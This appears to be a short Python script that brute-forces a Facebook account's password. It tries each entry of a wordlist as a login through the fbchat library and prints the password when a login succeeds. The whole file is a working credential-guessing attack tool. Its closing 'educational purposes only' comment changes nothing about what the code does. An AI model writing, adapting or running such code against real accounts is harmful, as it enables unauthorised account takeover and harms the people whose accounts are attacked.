from fbchat import Client
from time import sleep
from sys import exit

W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange

def facebook_bruteforce(username, wordlist, delay):
    with open(wordlist, 'r') as wl:
        for line in wl:
            password = line.strip()
            try:
                client = Client(username, password)
                print(f"{G}[*] Username: {username} | [*] Password found: {password}\n{W}")
                exit()
            except Exception as e:
                print(f"{O}[*] Username: {username} | [*] Password: {password} | Incorrect!\n{W}")
                sleep(delay)

# Note: This script is for educational purposes only.
